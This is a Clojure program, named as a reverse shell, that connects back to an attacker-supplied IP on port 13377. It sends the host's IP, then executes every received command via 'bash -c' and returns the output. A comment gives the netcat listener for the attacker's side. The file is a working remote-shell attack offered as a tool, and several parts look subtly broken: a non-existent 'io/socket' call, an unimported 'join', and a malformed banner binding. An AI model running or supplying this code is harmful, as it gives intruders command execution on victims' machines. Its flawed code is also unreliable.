(ns reverse-shell
  (:require [clojure.java.io :as io])
  (:gen-class))
; nc -l -p 13377
(defn read-command [sock po]
  (binding [*in* (io/reader sock)
            *out* (io/writer sock)]
    (while true
      (print "$ ")
      (flush)
      (let [cmd (read-line)]
        (if (= cmd "exit")
          (do
            (.close sock)
            (System/exit 0))
          (let [process (-> (Runtime/getRuntime)
                            (.exec (into-array ["bash" "-c" cmd]))
                            .getInputStream)
                output (->> (io/reader process)
                            (line-seq)
                            (join "\n"))]
            (println output)
            (flush)))))))

(defn -main [& args]
  (let [banner
        "  _____            _      _____          _\n"      
        " |  __ \\          | |    / ____|        | |\n"     
        " | |__) |___  __ _| |___| |     ___   __| | ___\n" 
        " |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\\n"
        " | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/\n"
        " |_|  \\_\\___|\\__,_|_/___|\\_____\\___/ \\__,_|\\___|\n"]

    (when (empty? args)
      (println "Please provide the IP address as a command-line argument.")
      (System/exit 1))

    (let [ip (first args)
          client-ip (-> (java.net.InetAddress/getLocalHost)
                        .getHostAddress)]
      (with-open [sock (io/socket ip 13377)]
        (binding [*out* (io/writer sock)]
          (println banner)
          (println (str "Client IP: " client-ip))
          (flush))
        (read-command sock 13377))))
